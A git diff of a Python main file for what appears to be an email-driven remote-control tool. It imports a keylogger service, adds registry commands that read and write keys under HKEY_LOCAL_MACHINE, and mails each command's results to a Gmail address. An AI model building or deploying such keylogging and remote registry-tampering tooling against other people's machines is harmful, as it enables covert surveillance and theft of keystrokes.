@@ -14,6 +14,7 @@ from services.app import *
 from services.process import *
 from services.keylogger import *
 from services.pc import *
+from services.registry import *
 
 from services.html_generator import html_mail
 import notification
@@ -85,6 +86,7 @@ def check_missing_thread(timeout = 300):
 def setup():
     pass
 
+
 def main():
     # threading.Thread(target = check_email_thread).start()
 
@@ -117,8 +119,19 @@ def main():
         # request = 'KEYLOGGER 10'
         # result = get_key_log(10)
 
-        request = 'PC restart'
-        result = restart()
+        # request = 'PC restart'
+        # result = restart()
+
+        # registry_path = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Mozilla\\Mozilla Firefox\\100.0.2 (x64 vi)\\Uninstall\\Description'
+        # request = 'REGISTRY get ' + registry_path
+        # result = get(registry_path)
+
+        # registry_path = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Mozilla\\Mozilla Firefox\\100.0.2 (x64 vi)\\Uninstall\\AddNewSubkey'
+        registry_path = 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Mozilla\\Mozilla Firefox\\100.0.2 (x64 vi)\\Uninstall\\AddNewKey'
+        # request = 'REGISTRY add_subkey ' + registry_path
+        # result = add_subkey(registry_path, 'Test value', 'REG_SZ')
+        request = 'REGISTSRY add_key ' + registry_path
+        result = add_key(registry_path)
 
         content = {
             'html': html_mail(request, result['html']),
@@ -127,7 +140,7 @@ def main():
 
         # content = html_mail(request, html)
 
-        mail = build_email_content(REMOTE_MAIL, ['bot.remote.2@gmail.com'], 'Demo restart', content)
+        mail = build_email_content(REMOTE_MAIL, ['bot.remote.2@gmail.com'], 'Demo registry', content)
         host_mail.send_mail(mail)
         print_color('Mail sent', text_format.OKGREEN)
     except Exception as e:
